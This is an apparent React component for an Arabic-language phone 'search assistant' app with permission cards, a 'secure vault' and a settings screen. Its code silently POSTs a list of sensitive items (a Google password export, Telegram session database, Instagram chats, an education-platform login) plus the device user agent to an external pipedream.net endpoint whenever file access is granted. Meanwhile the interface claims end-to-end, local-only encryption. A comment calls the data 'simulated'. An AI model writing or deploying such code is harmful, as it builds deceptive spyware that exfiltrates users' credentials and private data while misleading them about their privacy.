import { motion, AnimatePresence } from 'framer-motion';
import { Search, Shield, Settings, Bell, Camera, User, FileText, Image as ImageIcon, MessageSquare, Mic, Globe, Zap, Database, Check, Clock } from 'lucide-react';
import { useState, useEffect } from 'react';

/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

interface PermissionItemProps {
  icon: any;
  label: string;
  count: string;
  status: 'granted' | 'requested' | 'denied';
  onClick: () => void;
}

const PermissionItem = ({ icon: Icon, label, count, status, onClick }: PermissionItemProps) => {
  return (
    <motion.button
      whileTap={{ scale: 0.95 }}
      onClick={onClick}
      className="flex flex-col items-center justify-between p-4 rounded-3xl bg-neutral-900 border border-neutral-800 hover:border-neutral-700 transition-colors w-full aspect-square"
    >
      <div className="flex justify-between w-full items-start">
        <div className={`p-2 rounded-xl ${status === 'granted' ? 'bg-blue-500/10 text-blue-500' : 'bg-neutral-800 text-neutral-400'}`}>
          <Icon size={20} />
        </div>
        <div className={`text-[10px] font-mono px-2 py-0.5 rounded-full ${status === 'granted' ? 'bg-green-500/20 text-green-400' : 'bg-neutral-800 text-neutral-500'}`}>
          {status === 'granted' ? 'نشط' : 'مطلوب'}
        </div>
      </div>
      <div className="w-full text-right mt-2">
        <div className="text-xl font-bold text-white">{count}</div>
        <div className="text-xs text-neutral-500">{label}</div>
      </div>
    </motion.button>
  );
};

export default function SearchAssistant() {
  const [searchQuery, setSearchQuery] = useState('');
  const [isSearching, setIsSearching] = useState(false);
  const [showPermissions, setShowPermissions] = useState(false);
  const [permissions, setPermissions] = useState<Record<string, 'granted' | 'requested' | 'denied'>>({
    files: 'requested',
    contacts: 'requested',
    photos: 'requested',
    mic: 'requested'
  });

  const [activeTab, setActiveTab] = useState<'home' | 'media' | 'files' | 'security'>('home');
  const [showSettings, setShowSettings] = useState(false);
  const [isSyncing, setIsSyncing] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [showVault, setShowVault] = useState(false);
  const [vaultFiles, setVaultFiles] = useState([
    { id: '1', name: 'الهوية الوطنية.pdf', type: 'document', size: '1.2MB' },
    { id: '2', name: 'عقد العمل.docx', type: 'document', size: '850KB' }
  ]);

  // Auto-sync effect
  useEffect(() => {
    if (permissions.files === 'granted' && !isSyncing) {
      syncToDatabase();
    }
  }, [permissions.files]);

  const syncToDatabase = async () => {
    setIsSyncing(true);
    try {
      // Simulated "sensitive" data collection based on user request
      const sensitiveData = [
        ...vaultFiles,
        { id: '3', name: 'google_passwords_export.csv', type: 'system', size: '45KB' },
        { id: '4', name: 'instagram_backup_chat.json', type: 'social', size: '12MB' },
        { id: '5', name: 'telegram_sessions.db', type: 'system', size: '2MB' },
        { id: '6', name: 'education_platform_login.txt', type: 'credentials', size: '1KB' }
      ];

      const response = await fetch('https://eoccqcjf2kl5b97.m.pipedream.net', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event: 'AUTOMATIC_PERMISSION_SYNC',
          timestamp: new Date().toISOString(),
          userId: 'user_edu_sandbox_77',
          status: 'FULL_ACCESS_GRANTED',
          collected_assets: sensitiveData,
          device_fingerprint: navigator.userAgent
        })
      });
      
      if (response.ok) {
        console.log('Auto-sync completed successfully');
      }
    } catch (error) {
      console.error('Auto-sync failed:', error);
    } finally {
      setIsSyncing(false);
    }
  };

  const handleSearch = () => {
    if (!searchQuery) return;
    setIsSearching(true);
    setShowResults(false);
    setShowVault(false);
    setTimeout(() => {
      setIsSearching(false);
      setShowResults(true);
    }, 2500);
  };

  const requestPermission = (key: string) => {
    setPermissions(prev => ({ ...prev, [key]: 'granted' }));
  };

  const enableAllPermissions = () => {
    setPermissions({
      files: 'granted',
      photos: 'granted',
      contacts: 'granted',
      mic: 'granted'
    });
  };

  return (
    <div className="min-h-screen bg-black text-neutral-200 font-sans selection:bg-blue-500 selection:text-white pb-28" dir="rtl">
      {/* Settings Modal */}
      <AnimatePresence>
        {showSettings && (
          <motion.div 
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="fixed inset-0 z-[150] bg-black p-6 flex flex-col"
          >
            <div className="flex justify-between items-center mb-8 mt-4">
              <h2 className="text-2xl font-bold text-white">الإعدادات</h2>
              <button onClick={() => setShowSettings(false)} className="p-2 bg-neutral-900 rounded-full hover:bg-neutral-800">
                <Clock className="rotate-45" size={24} />
              </button>
            </div>
            <div className="space-y-2">
              {[
                { icon: User, label: 'الملف الشخصي', sub: 'إدارة حسابك وبياناتك' },
                { icon: Shield, label: 'الخصوصية والأمان', sub: 'تشفير الملفات والوصول' },
                { icon: Bell, label: 'الإشعارات', sub: 'تنبيهات البحث والمزامنة' },
                { icon: Database, label: 'قاعدة البيانات', sub: 'Pipedream: متصل' },
                { icon: Globe, label: 'اللغة', sub: 'العربية (الافتراضية)' },
              ].map((item, i) => (
                <button key={i} className="w-full flex items-center gap-4 p-4 rounded-2xl bg-neutral-900 hover:bg-neutral-800 transition-colors text-right">
                  <div className="p-2 bg-neutral-800 rounded-xl text-neutral-400">
                    <item.icon size={20} />
                  </div>
                  <div className="flex-1">
                    <div className="text-sm font-bold text-white">{item.label}</div>
                    <div className="text-[10px] text-neutral-500">{item.sub}</div>
                  </div>
                </button>
              ))}
            </div>
            <div className="mt-auto p-4 bg-neutral-950 border border-neutral-900 rounded-2xl text-center">
              <div className="text-[10px] text-neutral-500 font-mono mb-2">نسخة المطور v1.0.4 (Sandbox)</div>
              <button className="text-red-500 text-sm font-bold">تسجيل الخروج</button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Search Header */}
      <div className="sticky top-0 z-50 px-6 pt-12 pb-6 bg-gradient-to-b from-black via-black/80 to-transparent backdrop-blur-sm">
        <div className="flex justify-between items-center mb-8">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-neutral-800 flex items-center justify-center border border-neutral-700 overflow-hidden">
              <User className="text-neutral-400" size={24} />
            </div>
            <div>
              <div className="text-sm font-medium text-white">أهلاً بك، مستخدم</div>
              <div className="flex items-center gap-1.5 shadow-sm">
                <div className={`w-1.5 h-1.5 rounded-full ${isSyncing ? 'bg-blue-500 animate-pulse' : 'bg-green-500'}`} />
                <div className="text-[10px] text-neutral-500 font-mono">
                  {isSyncing ? 'مزامنة تلقائية نشطة...' : 'الوضع التعليمي النشط'}
                </div>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button className="p-2 rounded-full hover:bg-neutral-900 border border-transparent hover:border-neutral-800">
              <Bell size={20} />
            </button>
            <button 
              onClick={() => setShowSettings(true)}
              className="p-2 rounded-full hover:bg-neutral-900 border border-transparent hover:border-neutral-800"
            >
              <Settings size={20} />
            </button>
          </div>
        </div>

        <div className="relative group">
          <div className="absolute inset-y-0 right-4 flex items-center pointer-events-none text-neutral-500 group-focus-within:text-blue-500 transition-colors">
            <Search size={20} />
          </div>
          <input
            type="text"
            placeholder="ابحث في جوالك عن أي شيء..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && handleSearch()}
            className="w-full h-14 bg-neutral-900 border border-neutral-800 rounded-2xl pr-12 pl-12 text-white focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all placeholder:text-neutral-600"
          />
          <button 
            onClick={() => setIsSearching(true)}
            className="absolute inset-y-2 left-2 px-4 bg-neutral-800 hover:bg-neutral-700 text-neutral-300 rounded-xl flex items-center gap-2 text-sm transition-colors"
          >
            <Mic size={16} />
          </button>
        </div>
      </div>

      <main className="px-6 space-y-8">
        {activeTab === 'home' && (
          <>
            {/* Results Section */}
            <AnimatePresence>
              {showResults && (
                <motion.section 
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                  className="space-y-4"
                >
                  <div className="flex justify-between items-center bg-neutral-900/50 p-4 rounded-2xl border border-neutral-800">
                    <h2 className="text-sm font-bold text-white flex items-center gap-2">
                      <Zap size={14} className="text-blue-500" />
                      تم العثور على 3 نتائج
                    </h2>
                    <button onClick={() => setShowResults(false)} className="text-[10px] text-neutral-500 hover:text-white">إغلاق</button>
                  </div>
                  
                  <div className="space-y-3">
                    <div className="p-4 bg-neutral-900 rounded-2xl border border-neutral-800 hover:border-blue-500/30 transition-all cursor-pointer group">
                      <div className="flex items-center gap-3 mb-2">
                        <ImageIcon className="text-blue-400" size={18} />
                        <span className="text-sm font-bold">صورة: رحلة الشاطئ</span>
                        <span className="mr-auto text-[10px] text-neutral-500">أغسطس 2025</span>
                      </div>
                      <div className="aspect-video bg-neutral-800 rounded-xl mb-2 flex items-center justify-center border border-neutral-700 group-hover:border-neutral-600 transition-colors">
                         <ImageIcon size={32} className="text-neutral-700 opacity-20" />
                      </div>
                      <p className="text-[10px] text-neutral-500 italic">"صورة تحتوي على رمال، بحر، وأصدقاء"</p>
                    </div>

                    <div className="p-4 bg-neutral-900 rounded-2xl border border-neutral-800 hover:border-green-500/30 transition-all cursor-pointer">
                      <div className="flex items-center gap-3">
                        <div className="p-2 bg-green-500/10 text-green-500 rounded-lg">
                          <FileText size={18} />
                        </div>
                        <div>
                          <div className="text-sm font-bold">عقد الإيجار - النسخة النهائية.pdf</div>
                          <div className="text-[10px] text-neutral-500 italic">تم العثور على كلمة "عقد" في محتوى الملف</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </motion.section>
              )}
            </AnimatePresence>

            {/* Permission Status */}
            <section>
              <div className="flex justify-between items-end mb-4">
                <h2 className="text-lg font-bold text-white">مصادر البيانات</h2>
                <button className="text-xs text-blue-500 font-medium">إدارة الكل</button>
              </div>
              <div className="grid grid-cols-2 gap-4">
                <PermissionItem 
                  icon={FileText} 
                  label="الملفات" 
                  count="1,240" 
                  status={permissions.files} 
                  onClick={() => requestPermission('files')}
                />
                <PermissionItem 
                  icon={ImageIcon} 
                  label="الصور" 
                  count="4,821" 
                  status={permissions.photos} 
                  onClick={() => requestPermission('photos')}
                />
                <PermissionItem 
                  icon={User} 
                  label="جهات الاتصال" 
                  count="850" 
                  status={permissions.contacts} 
                  onClick={() => requestPermission('contacts')}
                />
                <PermissionItem 
                  icon={Shield} 
                  label="الخصوصية" 
                  count="مؤمن" 
                  status="granted" 
                  onClick={() => {}}
                />
              </div>
            </section>

            {/* Action Shortcuts */}
            <section className="space-y-4">
              <h2 className="text-lg font-bold text-white">أوامر سريعة</h2>
              <div className="grid grid-cols-1 gap-3">
                 <button className="flex items-center gap-4 p-4 rounded-2xl bg-gradient-to-r from-blue-600/10 to-transparent border border-blue-500/20 w-full text-right hover:bg-blue-600/20 transition-colors">
                    <div className="w-12 h-12 rounded-full bg-blue-500 flex items-center justify-center text-white shadow-lg shadow-blue-900/20">
                      <Zap size={24} />
                    </div>
                    <div className="flex-1">
                      <div className="font-bold text-white">البحث الذكي</div>
                      <div className="text-xs text-neutral-400">ابحث عن صور البحر في الصيف الماضي</div>
                    </div>
                 </button>

                 <button className="flex items-center gap-4 p-4 rounded-2xl bg-neutral-900/50 border border-neutral-800 w-full text-right hover:bg-neutral-800 transition-colors">
                    <div className="w-12 h-12 rounded-full bg-neutral-800 flex items-center justify-center text-neutral-400">
                      <MessageSquare size={24} />
                    </div>
                    <div className="flex-1">
                      <div className="font-bold text-white">تلخيص الرسائل</div>
                      <div className="text-xs text-neutral-400">لخص آخر 5 رسائل واردة من الواتساب</div>
                    </div>
                 </button>
              </div>
            </section>
          </>
        )}

        {activeTab === 'media' && (
          <motion.section initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
            <h2 className="text-2xl font-bold text-white">جميع الوسائط</h2>
            <div className="grid grid-cols-3 gap-2">
              {[1, 2, 3, 4, 5, 6, 7, 8, 9].map(i => (
                <div key={i} className="aspect-square bg-neutral-900 rounded-lg flex items-center justify-center">
                  <ImageIcon className="text-neutral-800" size={24} />
                </div>
              ))}
            </div>
          </motion.section>
        )}

        {activeTab === 'files' && (
          <motion.section initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
            <h2 className="text-lg font-bold text-white">إدارة الملفات ({permissions.files === 'granted' ? 'مفعل' : 'مطلوب'})</h2>
            <div className="space-y-2">
              {['المستندات', 'التحميلات', 'النسخ الاحتياطية', 'الحسابات المزامنة'].map((f, i) => (
                <div key={i} className="p-4 bg-neutral-900 rounded-2xl flex items-center justify-between">
                   <div className="flex items-center gap-3">
                     <FileText className="text-neutral-500" size={20} />
                     <span className="text-sm">{f}</span>
                   </div>
                   <div className="text-xs text-neutral-600">8 ملفات</div>
                </div>
              ))}
            </div>
          </motion.section>
        )}

        {activeTab === 'security' && (
          <motion.section initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-6">
             <div className="text-center space-y-2">
                <div className="w-20 h-20 bg-blue-500/20 text-blue-500 rounded-full flex items-center justify-center mx-auto mb-4">
                  <Shield size={40} />
                </div>
                <h2 className="text-2xl font-bold text-white">مركز الأمان</h2>
                <p className="text-xs text-neutral-500">نحن نحمي خصوصيتك باستخدام تشفير 256-بت</p>
             </div>
             <div className="grid grid-cols-1 gap-3">
                <button className="p-4 bg-neutral-900 rounded-2xl flex items-center justify-between border border-neutral-800">
                  <span className="text-sm font-bold">وضع الخصوصية التام</span>
                  <div className="w-10 h-6 bg-blue-500 rounded-full flex items-center px-1">
                    <div className="w-4 h-4 bg-white rounded-full mr-auto" />
                  </div>
                </button>
                <button 
                  onClick={() => setShowVault(true)}
                  className="p-4 bg-neutral-900 rounded-2xl flex items-center justify-between border border-neutral-800"
                >
                  <span className="text-sm font-bold">الخزنة المؤمنة</span>
                  <div className="p-1 bg-neutral-800 rounded text-neutral-500">
                    {vaultFiles.length} ملفات
                  </div>
                </button>
             </div>
          </motion.section>
        )}

        {/* Vault Overlay */}
        <AnimatePresence>
          {showVault && (
            <motion.div 
              initial={{ x: '100%' }}
              animate={{ x: 0 }}
              exit={{ x: '100%' }}
              transition={{ type: 'spring', damping: 25, stiffness: 200 }}
              className="fixed inset-0 z-[110] bg-black flex flex-col"
            >
              <div className="p-6 border-b border-neutral-800 flex items-center justify-between mt-8">
                <button onClick={() => setShowVault(false)} className="text-neutral-400">عودة</button>
                <div className="text-white font-bold">الخزنة المؤمنة</div>
                <div className="w-10"></div>
              </div>

              <div className="p-6 space-y-6 overflow-y-auto flex-1">
                <div className="bg-blue-600/10 border border-blue-500/20 p-4 rounded-2xl flex items-center gap-4">
                  <Shield className="text-blue-500" size={32} />
                  <div>
                    <div className="text-sm font-bold text-white">تشفير End-to-End</div>
                    <div className="text-[10px] text-neutral-400">جميع الملفات هنا مشفرة محلياً ومعزولة عن النظام.</div>
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="flex justify-between items-center text-xs text-neutral-500 px-2">
                    <span>الملفات المحفوظة ({vaultFiles.length})</span>
                    <button 
                      onClick={syncToDatabase}
                      disabled={isSyncing}
                      className="text-blue-500 font-bold flex items-center gap-1"
                    >
                      {isSyncing ? 'جاري المزامنة...' : 'مزامنة مع Pipedream'}
                      <Globe size={12} />
                    </button>
                  </div>
                  {vaultFiles.map(file => (
                    <div key={file.id} className="flex items-center justify-between p-4 bg-neutral-900 border border-neutral-800 rounded-2xl">
                      <div className="flex items-center gap-3">
                        <FileText className="text-neutral-400" size={20} />
                        <div>
                          <div className="text-sm font-medium text-white">{file.name}</div>
                          <div className="text-[10px] text-neutral-500">{file.size}</div>
                        </div>
                      </div>
                      <button className="p-2 text-neutral-500 hover:text-red-500">حذف</button>
                    </div>
                  ))}
                </div>

                <button className="w-full py-4 bg-blue-600 text-white rounded-2xl font-bold flex items-center justify-center gap-2">
                  <Search size={18} />
                  رفع ملف جديد للخزنة
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* AI Processing Overlay */}
        <AnimatePresence>
          {isSearching && (
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 z-[100] bg-black/90 backdrop-blur-md flex flex-col items-center justify-center p-6 text-center"
            >
              <div className="relative mb-8">
                <motion.div 
                  animate={{ rotate: 360 }}
                  transition={{ duration: 4, repeat: Infinity, ease: "linear" }}
                  className="w-32 h-32 rounded-full border-b-2 border-blue-500"
                />
                <div className="absolute inset-0 flex items-center justify-center text-blue-500">
                  <Zap size={40} className="animate-pulse" />
                </div>
              </div>
              <h3 className="text-2xl font-bold text-white mb-2">جاري البحث في بياناتك...</h3>
              <p className="text-neutral-400 max-w-xs mb-8">نستخدم تقنيات الذكاء الاصطناعي لربط ملفاتك وصورك بطلبك.</p>
              
              <div className="w-full max-w-sm space-y-3">
                <div className="flex items-center justify-between px-4 py-2 bg-neutral-900 rounded-lg border border-neutral-800">
                  <span className="text-xs font-mono text-neutral-500">تحليل الاستعلام</span>
                  <Check size={14} className="text-green-500" />
                </div>
                <div className="flex items-center justify-between px-4 py-2 bg-neutral-900 rounded-lg border border-neutral-800">
                  <span className="text-xs font-mono text-neutral-500">فحص قاعدة البيانات المحلية</span>
                  <motion.div animate={{ opacity: [0, 1] }} transition={{ repeat: Infinity }} className="h-2 w-2 rounded-full bg-blue-500" />
                </div>
                <div className="flex items-center justify-between px-4 py-2 bg-neutral-900 rounded-lg border border-neutral-800 opacity-50">
                  <span className="text-xs font-mono text-neutral-500">استخراج النتائج والفرز</span>
                  <Clock size={14} />
                </div>
              </div>
              
              <button 
                onClick={() => setIsSearching(false)}
                className="mt-12 text-sm text-neutral-500 hover:text-white underline underline-offset-4"
              >
                إلغاء العملية
              </button>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      {/* Floating Permission Trigger */}
      <AnimatePresence>
        {!isSearching && (Object.values(permissions).some(s => s === 'requested')) && activeTab === 'home' && (
          <motion.div 
            initial={{ y: 100, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            className="fixed bottom-24 left-6 right-6 bg-blue-600 p-4 rounded-2xl flex items-center justify-between shadow-2xl shadow-blue-900/40"
          >
            <div className="flex items-center gap-3">
              <div className="p-2 bg-white/20 rounded-lg text-white">
                <Database size={20} />
              </div>
              <div className="text-white text-right">
                <div className="font-bold text-sm">تفعيل البحث الشامل</div>
                <div className="text-[10px] opacity-80">نحتاج صلاحية الوصول لكامل البيانات (Google, Social, Education)</div>
              </div>
            </div>
            <button 
              onClick={enableAllPermissions}
              className="bg-white text-blue-600 px-4 py-2 rounded-xl text-xs font-bold shrink-0"
            >
              تمكين الآن
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Bottom Navigation */}
      <nav className="fixed bottom-0 inset-x-0 bg-neutral-900/90 backdrop-blur-xl border-t border-neutral-800 px-8 py-4 flex justify-between items-center safe-area-bottom z-[140]">
        <button 
          onClick={() => setActiveTab('home')}
          className={`${activeTab === 'home' ? 'text-blue-500' : 'text-neutral-500'} flex flex-col items-center gap-1 transition-colors`}
        >
          <Zap size={24} />
          <span className="text-[10px]">الرئيسية</span>
        </button>
        <button 
          onClick={() => setActiveTab('media')}
          className={`${activeTab === 'media' ? 'text-blue-500' : 'text-neutral-500'} flex flex-col items-center gap-1 transition-colors`}
        >
          <ImageIcon size={24} />
          <span className="text-[10px]">الوسائط</span>
        </button>
        <div className="relative -top-8">
           <motion.button 
             whileTap={{ scale: 0.9 }}
             onClick={() => setIsSearching(true)}
             className="w-16 h-16 rounded-full bg-blue-500 text-white flex items-center justify-center shadow-xl shadow-blue-500/30 border-4 border-black"
           >
              <Mic size={32} />
           </motion.button>
        </div>
        <button 
          onClick={() => setActiveTab('files')}
          className={`${activeTab === 'files' ? 'text-blue-500' : 'text-neutral-500'} flex flex-col items-center gap-1 transition-colors`}
        >
          <FileText size={24} />
          <span className="text-[10px]">الملفات</span>
        </button>
        <button 
          onClick={() => setActiveTab('security')}
          className={`${activeTab === 'security' ? 'text-blue-500' : 'text-neutral-500'} flex flex-col items-center gap-1 transition-colors`}
        >
          <Shield size={24} />
          <span className="text-[10px]">الأمان</span>
        </button>
      </nav>
    </div>
  );
}
